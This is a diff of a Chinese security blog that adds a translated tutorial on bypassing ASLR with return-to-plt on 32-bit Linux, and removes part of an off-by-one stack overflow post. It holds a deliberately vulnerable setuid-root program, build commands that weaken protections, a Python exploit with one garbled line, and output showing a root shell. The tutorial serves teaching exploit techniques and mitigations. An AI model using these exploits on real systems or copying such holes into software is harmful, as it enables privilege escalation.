@@ -112,6 +112,129 @@
         
           <section id="main">
   
+    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
+	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》</p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 ASLR</li>
+<li>0x02 Return-to-plt</li>
+<li>0x03 调用‘function@PLT’</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
+<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
+<ul>
+<li>栈地址（为了跳转到shellcode中)</li>
+<li>libc基地址(为了成功绕过NX)</li>
+</ul>
+<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
+<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
+<ul>
+<li>栈地址</li>
+<li>堆地址</li>
+<li>共享库地址</li>
+</ul>
+<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
+<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
+<pre><code>libc函数地址=libc基地址+函数偏移
+</code></pre><p>这里</p>
+<ul>
+<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
+<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
+</ul>
+<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
+<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre><p>libc基地址将会被随机化</p>
+<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
+<ul>
+<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
+<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
+<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
+</ul>
+<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
+<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
+</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
+<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
+<pre><code>什么是PIC呢？
+</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
+<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
+<ul>
+<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
+<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
+</ul>
+<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
+<p><u>代码样例</u>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
+<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
+<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
+<p><u>漏洞利用代码</u>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
+<p>执行上述程序就可以获取root shell，如下所示：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -3059,125 +3182,6 @@ $ echo $?
 <!-- Table of Contents -->
 
   
-    <article id="post-stackoffbyone"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161231/stackoffbyone/">栈内off-by-one漏洞利用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20161231/stackoffbyone/" class="article-date">
-	  <time datetime="2016-12-31T06:38:26.000Z" itemprop="datePublished">十二月 31, 2016</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)漏洞利用系列-栈内Off-by-one漏洞利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 什么是off-by-one漏洞</li>
-<li>0X02 如何实现任意代码执行</li>
-<li>0X03 如果调用者的EBP不在目标缓冲区正上方，该怎么办</li>
-<li>0X04 什么情况下调用者的EBP不在目标缓冲区正上方</li>
-</ul>
-</blockquote>
-<p><u><em>阅读基础:</em></u></p>
-<ol>
-<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
-</ol>
-<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
-<h3 id="0X01-什么是off-by-one漏洞？"><a href="#0X01-什么是off-by-one漏洞？" class="headerlink" title="0X01 什么是off-by-one漏洞？"></a>0X01 什么是off-by-one漏洞？</h3><p>将源缓冲区复制到目标缓冲区时，以下情况可能导致Off-By-One漏洞：</p>
-<pre><code>源字符串长度等于目标缓冲区长度
-</code></pre><p>当源字符串长度等于目标缓冲区长度时，单个NULL字节就会被复制到目标缓冲区上方。这种情况下，由于目标缓冲区存储在栈内，因此，仅凭单个NULL字节就能把栈内调用者EBP的最低有效位(LSB)覆盖掉。</p>
-<p>依照惯例，未免定义过于枯燥，下面我们就来看一则Off-By-One漏洞代码。</p>
-<p><u><em>漏洞代码：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> bar(arg); <span class="comment">/* [1] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"> &#125;</div><div class="line"> foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u><em>编译命令：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>上述漏洞代码的第[2]行就是Off-By-One溢出问题可能出现的地方。由于目标缓冲区长度为256，因此256字节的源字符串就可能导致任意代码执行。</p>
-<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
-<h3 id="0X02-如何实现任意代码执行"><a href="#0X02-如何实现任意代码执行" class="headerlink" title="0X02 如何实现任意代码执行"></a>0X02 如何实现任意代码执行</h3><p>任意代码执行是通过“EBP 覆盖（EBP overwrite）”方法实现的。如果调用者的EBP位于目标缓冲区上方，那么执行strcpy后，调用者的EBP的LSB很可能已然被单个NULL字节覆盖了。为了进一步了解off-by-one，我们来反汇编一则漏洞代码并且画出它的堆栈布局吧。</p>
-<p><u><em>反汇编：</em></u></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"> (gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (main) ebp to esp</span></div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi                    <span class="comment">//backup EDI</span></div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x8</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax           <span class="comment">//eax = 